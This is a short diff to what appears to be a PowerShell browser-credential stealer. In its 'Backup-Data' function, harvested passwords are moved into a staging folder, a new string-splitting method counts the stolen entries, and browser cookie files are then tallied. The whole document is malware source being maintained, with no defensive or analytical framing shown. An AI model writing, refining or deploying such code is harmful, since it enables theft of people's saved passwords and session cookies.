@@ -1199,12 +1199,10 @@ function Backup-Data {
     Move-Item -Path "$main_temp\passwords.json" -Destination "$browser_data" -Force
 	Start-Sleep -s 3
 	
-	#Count Passwd
+	#Count Passwords
 	$jsonFilePath = "$browser_data\passwords.json"
 	$jsonContent = Get-Content -Path $jsonFilePath -Raw
-	$serializer = New-Object System.Web.Script.Serialization.JavaScriptSerializer
-	$jsonObjects = $serializer.DeserializeObject($jsonContent)
-	$passwordCounter = $jsonObjects.Length
+	$passwordCounter = ($jsonContent -split '"password":').Length - 1
 	#Count Coockies
 	$cookieFiles = Get-ChildItem -Path $browser_data -Filter "cookies_netscape*"
 	foreach ($file in $cookieFiles) {
